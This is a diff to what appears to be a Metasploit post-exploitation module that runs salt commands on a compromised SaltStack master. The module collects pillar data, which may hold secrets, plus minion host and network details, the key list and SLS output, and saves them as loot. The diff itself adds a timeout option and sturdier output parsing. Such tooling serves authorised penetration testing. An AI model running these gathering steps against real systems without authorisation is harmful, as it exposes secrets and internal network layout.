@@ -36,7 +36,8 @@ class MetasploitModule < Msf::Post
         OptString.new('MINIONS', [true, 'Minions Target', '*']),
         OptBool.new('GETHOSTNAME', [false, 'Gather Hostname from minions', true]),
         OptBool.new('GETIP', [false, 'Gather IP from minions', true]),
-        OptBool.new('GETOS', [false, 'Gather OS from minions', true])
+        OptBool.new('GETOS', [false, 'Gather OS from minions', true]),
+        OptInt.new('TIMEOUT', [true, 'Timeout for salt commands to run', 120])
       ]
     )
   end
@@ -44,7 +45,7 @@ class MetasploitModule < Msf::Post
   def gather_pillars
     print_status('Gathering pillar data')
     begin
-      out = cmd_exec("salt '#{datastore['MINIONS']}' --output=yaml pillar.items")
+      out = cmd_exec('salt', "'#{datastore['MINIONS']}' --output=yaml pillar.items", datastore['TIMEOUT'])
       vprint_status(out)
       results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
       store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Pillar Gather')
@@ -56,7 +57,7 @@ class MetasploitModule < Msf::Post
   end
 
   def gather_minion_data
-    print_status('Gathering data from minions')
+    print_status('Gathering data from minions (this can take some time)')
     command = []
     if datastore['GETHOSTNAME']
       command << 'network.get_hostname'
@@ -72,9 +73,9 @@ class MetasploitModule < Msf::Post
     commas = ',' * (command.length - 1) # we need to provide empty arguments for each command
     command = "salt '#{datastore['MINIONS']}' --output=yaml #{command.join(',')} #{commas}"
     begin
-      out = cmd_exec(command)
+      out = cmd_exec(command, nil, datastore['TIMEOUT'])
       if out == '' || out.nil?
-        print_error('No results returned. Possible timeout, try again later, or try fewer GET* commands at once')
+        print_error('No results returned. Try increasing the TIMEOUT or decreasing the minions being checked')
         return
       end
       vprint_status(out)
@@ -86,28 +87,43 @@ class MetasploitModule < Msf::Post
       return
     end
     return if results == false || results.nil?
-    return if results.include?('Salt request timed out.')
+    return if results.include?('Salt request timed out.') || results.include?('Minion did not return.')
 
     results.each do |_key, result|
+      # at times the first line may be "Minions returned with non-zero exit code", so we want to skip that
+      next if result.is_a? String
+
       host_info = {
         name: result['network.get_hostname'],
         os_flavor: result['status.version'],
         comments: "SaltStack minion to #{session.session_host}"
       }
       # mac os
-      if result['system.get_system_info'].include?('Traceback') && result['status.version'].include?('unsupported on the current operating system')
+      if result.key?('system.get_system_info') &&
+         result['system.get_system_info'].include?('Traceback') &&
+         result.key?('status.version') &&
+         result['status.version'].include?('unsupported on the current operating system')
         host_info[:os_name] = 'osx' # taken from lib/msf/core/post/osx/system
+        host_info[:os_flavor] = ''
       # windows will throw a traceback error for status.version
-      elsif result['status.version'].include? 'Traceback'
+      elsif result.key?('status.version') &&
+            result['status.version'].include?('Traceback')
         info = result['system.get_system_info']
         host_info[:os_name] = info['os_name']
         host_info[:os_flavor] = info['os_version']
         host_info[:purpose] = info['os_type']
       end
+
+      unless datastore['GETIP'] # if we dont get IP, can't make hosts
+        print_good("Found minion: #{host_info[:name]} - #{host_info[:os_flavor]}")
+        next
+      end
+
       result['network.interfaces'].each do |name, interface|
         next if name == 'lo'
         next if interface['hwaddr'] == ':::::' # Windows Software Loopback Interface
         next unless interface.key? 'inet' # skip if it doesn't have an inet, macos had lots of this
+        next if interface['inet'][0]['address'] == '127.0.0.1' # ignore localhost
 
         host_info[:mac] = interface['hwaddr']
         host_info[:host] = interface['inet'][0]['address'] # ignoring inet6
@@ -125,7 +141,7 @@ class MetasploitModule < Msf::Post
       return
     end
     begin
-      out = cmd_exec('salt-key -L --output=yaml')
+      out = cmd_exec('salt-key', '-L --output=yaml', datastore['TIMEOUT'])
       vprint_status(out)
       minions = YAML.safe_load(out)
     rescue Psych::SyntaxError
@@ -184,7 +200,7 @@ class MetasploitModule < Msf::Post
       return
     end
     print_status('Showing SLS')
-    output = cmd_exec("salt '#{datastore['MINIONS']}' state.show_sls '*'")
+    output = cmd_exec('salt', "'#{datastore['MINIONS']}' state.show_sls '*'", datastore['TIMEOUT'])
     store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Master SLS Output')
     print_good("#{peer} - SLS output successfully retrieved and saved to #{store_path}")
 
